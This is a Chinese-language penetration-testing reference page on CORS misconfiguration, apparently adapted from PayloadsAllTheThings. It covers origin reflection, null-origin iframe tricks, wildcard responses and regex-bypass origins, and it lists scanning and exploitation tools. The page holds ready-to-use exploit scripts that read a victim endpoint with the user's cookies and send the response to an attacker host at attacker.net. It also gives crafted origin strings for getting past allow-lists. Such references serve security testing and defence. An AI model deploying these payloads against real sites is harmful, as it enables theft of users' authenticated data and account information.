# CORS Misconfiguration - CORS配置错误

[SEARCH_KEYWORDS]
漏洞类型: CORS Misconfiguration Cross-Origin Resource Sharing CORS配置错误
攻击类型: Data Theft Credential Theft API Access Bypass
关键词: Access-Control-Allow-Origin Access-Control-Allow-Credentials Origin
头信息: ACAO ACAC Origin null wildcard
技术: Origin Reflection Null Origin Trusted Origin Regex Bypass

[CONTENT]

## CORS概述

CORS配置错误发生在API域名上。如果应用程序未将Origin头列入白名单且设置了Access-Control-Allow-Credentials: true，攻击者可以代表用户发起跨域请求。

## 漏洞条件

```
请求头: Origin: https://evil.com
响应头: Access-Control-Allow-Credentials: true
响应头: Access-Control-Allow-Origin: https://evil.com 或 null
```

## Origin反射攻击

### 漏洞响应

```http
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=...

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### 利用代码

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://victim.example.com/endpoint',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText;
};
```

## Null Origin攻击

### 漏洞响应

```http
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### 利用代码

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.net/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

## 可信Origin上的XSS

如果应用实现了严格的白名单，但有XSS漏洞：

```powershell
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

## 通配符Origin

如果服务器响应`*`，浏览器不会发送Cookie。但如果服务器不需要认证，仍然可以访问数据。

```http
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

## 正则绕过

### 前缀注入

```powershell
Origin: https://evilexample.com
# 匹配正则: example.com$
```

### 点号未转义

```powershell
Origin: https://apiiexample.com
# 匹配正则: ^api.example.com$ (未转义点号)
```

### 子域名注入

```powershell
Origin: https://victim.com.attacker.com
Origin: https://attackervictim.com
```

## 工具

- Corsy - CORS配置错误扫描器
- CORScanner - 快速CORS漏洞扫描器
- of-cors - 内网CORS利用工具
- CorsOne - CORS配置错误发现工具

## 参考文档

原始来源: PayloadsAllTheThings/CORS Misconfiguration/README.md